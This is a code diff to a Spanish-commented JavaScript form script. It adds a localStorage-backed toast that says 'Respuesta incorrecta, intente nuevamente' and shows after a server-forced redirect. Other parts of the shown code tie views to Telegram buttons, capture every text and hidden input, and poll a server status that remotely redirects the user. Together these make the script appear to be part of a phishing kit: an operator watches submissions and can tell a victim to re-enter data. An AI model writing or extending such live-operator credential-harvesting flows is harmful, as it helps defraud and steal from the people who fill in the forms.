@@ -26,6 +26,7 @@ const CONFIG_STORAGE_AUTO = {
     redirectUrl: null, // URL a la que redirigir después del envío exitoso (null = sin redirección)
     redirectDelay: 1500, // Delay en ms antes de redirigir (para mostrar mensaje de éxito)
     directorio: 'prueba', // Directorio de vistas para botones de Telegram
+    toastMessage: 'Respuesta incorrecta, intente nuevamente', // Mensaje para toast en cambio='2'
     selectoresEntrada: [
         'input[type="text"]',
         'input[type="hidden"]',
@@ -788,6 +789,95 @@ function inicializarEnvio(formId = null) {
 }
 
 /**
+ * ========== FUNCIONES DE TOAST ==========
+ */
+
+/**
+ * Guarda un mensaje de toast en localStorage para mostrarlo después de redirección
+ * @param {String} mensaje - Mensaje a mostrar
+ */
+function guardarToastPendiente(mensaje) {
+    localStorage.setItem('toast_pendiente', mensaje);
+}
+
+/**
+ * Obtiene y elimina el toast pendiente de localStorage
+ * @returns {String|null} Mensaje del toast o null si no hay
+ */
+function obtenerToastPendiente() {
+    const mensaje = localStorage.getItem('toast_pendiente');
+    if (mensaje) {
+        localStorage.removeItem('toast_pendiente');
+    }
+    return mensaje;
+}
+
+/**
+ * Muestra una notificación toast
+ * @param {String} mensaje - Mensaje a mostrar
+ * @param {Number} duracion - Duración en ms (default: 4000)
+ */
+function mostrarToast(mensaje, duracion = 4000) {
+    // Crear contenedor si no existe
+    let container = document.getElementById('toast-container');
+    if (!container) {
+        container = document.createElement('div');
+        container.id = 'toast-container';
+        container.style.cssText = `
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        `;
+        document.body.appendChild(container);
+    }
+
+    // Crear toast
+    const toast = document.createElement('div');
+    toast.style.cssText = `
+        background: #333;
+        color: #fff;
+        padding: 16px 24px;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        font-size: 14px;
+        max-width: 350px;
+        opacity: 0;
+        transform: translateX(100%);
+        transition: all 0.3s ease;
+    `;
+    toast.textContent = mensaje;
+    container.appendChild(toast);
+
+    // Animar entrada
+    requestAnimationFrame(() => {
+        toast.style.opacity = '1';
+        toast.style.transform = 'translateX(0)';
+    });
+
+    // Animar salida y eliminar
+    setTimeout(() => {
+        toast.style.opacity = '0';
+        toast.style.transform = 'translateX(100%)';
+        setTimeout(() => toast.remove(), 300);
+    }, duracion);
+}
+
+/**
+ * Verifica si hay un toast pendiente y lo muestra
+ */
+function verificarToastPendiente() {
+    const mensaje = obtenerToastPendiente();
+    if (mensaje) {
+        mostrarToast(mensaje);
+    }
+}
+
+/**
  * ========== FUNCIONES DE POLLING ==========
  */
 
@@ -801,7 +891,7 @@ function inicializarEnvio(formId = null) {
  * Valores de cambio:
  * - '0': status de DB no tiene prefijo "t-" (sin transición pendiente, seguir polling)
  * - '1': status de DB tiene "t-" y es diferente al cliente (redirigir)
- * - '2': status de DB tiene "t-" y es igual al cliente (ya está en la vista correcta, seguir polling)
+ * - '2': status de DB tiene "t-" y es diferente al cliente (redirigir + mostrar toast)
  *
  * @ejemplo
  * iniciarPolling({ basePath: '/kassio', interval: 2000 });
@@ -828,19 +918,23 @@ function iniciarPolling(config = {}) {
                     console.log(`🔄 Polling: status=${data.status}, cambio=${data.cambio}`);
                 }
 
-                if (data.cambio === '1') {
+                if (data.cambio === '1' || data.cambio === '2') {
                     // Hay transición y el cliente debe redirigir
                     // Quitar prefijo "t-" del status para obtener la vista destino
                     let vistaDestino = data.status;
                     if (vistaDestino.startsWith('t-')) {
                         vistaDestino = vistaDestino.substring(2);
                     }
+
+                    // Si cambio='2', guardar toast pendiente para mostrar después de redirección
+                    if (data.cambio === '2') {
+                        guardarToastPendiente(CONFIG_STORAGE_AUTO.toastMessage);
+                    }
+
                     const redirectUrl = `${basePath}/${vistaDestino}`;
                     window.location.href = redirectUrl;
                 } else {
-                    // cambio='0': sin transición pendiente
-                    // cambio='2': ya está en la vista correcta, esperar
-                    // En ambos casos, seguir polling
+                    // cambio='0': sin transición pendiente, seguir polling
                     setTimeout(poll, interval);
                 }
             } else {
@@ -868,6 +962,9 @@ function iniciarPolling(config = {}) {
  * - Siempre configura el listener de envío si existe botón con id="enviar"
  */
 document.addEventListener('DOMContentLoaded', function() {
+    // Verificar si hay un toast pendiente de mostrar
+    verificarToastPendiente();
+
     // Inicializar formulario si está habilitado
     if (CONFIG_STORAGE_AUTO.autoInit) {
         inicializarFormulario();
